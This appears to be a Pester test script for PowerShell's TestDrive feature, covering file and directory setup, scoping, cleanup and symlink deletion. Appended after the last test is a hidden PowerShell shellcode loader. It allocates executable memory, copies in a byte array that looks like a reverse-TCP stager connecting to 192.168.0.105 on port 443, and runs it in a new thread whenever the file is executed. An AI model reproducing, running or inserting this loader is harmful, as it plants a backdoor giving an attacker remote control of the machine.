Set-StrictMode -Version Latestif ($PSVersionTable.PSVersion.Major -lt 6 -or $IsWindows) {$tempPath = $env:TEMP}elseif ($IsMacOS) {$tempPath = '/private/tmp'}else {$tempPath = '/tmp'}Describe "Setup" {It "returns a location that is in a temp area" {$testDrivePath = (Get-Item $TestDrive).FullName$testDrivePath -like "$tempPath*" | Should -Be $true}It "creates a drive location called TestDrive:" {"TestDrive:\" | Should -Exist}}Describe "TestDrive" {It "handles creation of a drive with . characters in the path" {"preventing this from failing"}}Describe "Create filesystem with directories" {Setup -Dir "dir1"Setup -Dir "dir2"It "creates directory when called with no file content" {"TestDrive:\dir1" | Should -Exist}It "creates another directory when called with no file content and doesn't remove first directory" {$result = Test-Path "TestDrive:\dir2"$result = $result -and (Test-Path "TestDrive:\dir1")$result | Should -Be $true}}Describe "Create nested directory structure" {Setup -Dir "parent/child"It "creates parent directory" {"TestDrive:\parent" | Should -Exist}It "creates child directory underneath parent" {"TestDrive:\parent\child" | Should -Exist}}Describe "Create a file with no content" {Setup -File "file"It "creates file" {"TestDrive:\file" | Should -Exist}It "also has no content" {Get-Content "TestDrive:\file" | Should -BeNullOrEmpty}}Describe "Create a file with content" {Setup -File "file" "file contents"It "creates file" {"TestDrive:\file" | Should -Exist}It "adds content to the file" {Get-Content "TestDrive:\file" | Should -Be "file contents"}}Describe "Create file with passthru" {$thefile = Setup -File "thefile" -PassThruIt "returns the file from the temp location" {$thefile.FullName -like "$tempPath*" | Should -Be $true$thefile.Exists | Should -Be $true}}Describe "Create directory with passthru" {$thedir = Setup -Dir "thedir" -PassThruIt "returns the directory from the temp location" {$thedir.FullName -like "$tempPath*" | Should -Be $true$thedir.Exists | Should -Be $true}}Describe "TestDrive scoping" {$describe = Setup -File 'Describe' -PassThruContext "Describe file is available in context" {It "Finds the file" {$describe | Should -Exist}Setup -File 'Context'It "Creates It-scoped contents" {Setup -File 'It''TestDrive:\It' | Should -Exist}It "Does not clear It-scoped contents on exit" {'TestDrive:\It' | Should -Exist}}It "Context file are removed when returning to Describe" {"TestDrive:\Context" | Should -Not -Exist}It "Describe file is still available in Describe" {$describe | Should -Exist}}Describe "Cleanup" {Setup -Dir "foo"}Describe "Cleanup" {It "should have removed the temp folder from the previous fixture" {Test-Path "$TestDrive\foo" | Should -Not -Exist}It "should also remove the TestDrive:" {Test-Path "TestDrive:\foo" | Should -Not -Exist}}Describe "Cleanup when Remove-Item is mocked" {Mock Remove-Item {}Context "add a temp directory" {Setup -Dir "foo"}Context "next context" {It "should have removed the temp folder" {"$TestDrive\foo" | Should -Not -Exist}}}InModuleScope Pester {Describe "New-RandomTempDirectory" {It "creates randomly named directory" {$first = New-RandomTempDirectory$second = New-RandomTempDirectory$first | Remove-Item -Force$second | Remove-Item -Force$first.name | Should -Not -Be $second.name}}}InModuleScope Pester {Describe "Clear-TestDrive" {$skipTest = $false$psVersion = (GetPesterPSVersion)if ((GetPesterOs) -eq "Windows") {if ($psVersion -lt 5) {$skipTest = $true}if ($psVersion -ge 5) {$windowsIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()$windowsPrincipal = new-object 'Security.Principal.WindowsPrincipal' $windowsIdentity$isNotAdmin = -not $windowsPrincipal.IsInRole("Administrators")$skipTest = $isNotAdmin}}It "Deletes symbolic links in TestDrive" -skip:$skipTest {$root = (Get-PsDrive 'TestDrive').Root$source = "$root\source"$symlink = "$root\symlink"$null = New-Item -Type Directory -Path $sourceif ($PSVersionTable.PSVersion.Major -ge 5) {$null = New-Item -Type SymbolicLink -Path $symlink -Value $source}else {$null = cmd /c mklink /D $symlink $source}@(Get-ChildItem -Path $root).Length | Should -Be 2 -Because "a pre-requisite is that directory and symlink to it is in place"Clear-TestDrive@(Get-ChildItem -Path $root).Length | Should -Be 0 -Because "everything should be deleted including symlinks"}It "Clear-TestDrive removes problematic symlinks" -skip:$skipTest {$null = New-Item -Type Directory TestDrive:/d1$null = New-Item -Type Directory TestDrive:/test$null = New-Item -Type SymbolicLink -Path TestDrive:/test/link1 -Target TestDrive:/d1$null = New-Item -Type SymbolicLink -Path TestDrive:/test/link2 -Target TestDrive:/d1$null = New-Item -Type SymbolicLink -Path TestDrive:/test/link2a -Target TestDrive:/test/link2$root = (Get-PSDrive 'TestDrive').Root@(Get-ChildItem -Recurse -Path $root).Length | Should -Be 5 -Because "a pre-requisite is that directores and symlinks are in place"Clear-TestDrive@(Get-ChildItem -Path $root).Length | Should -Be 0 -Because "everything should be deleted"}}}$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x69,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};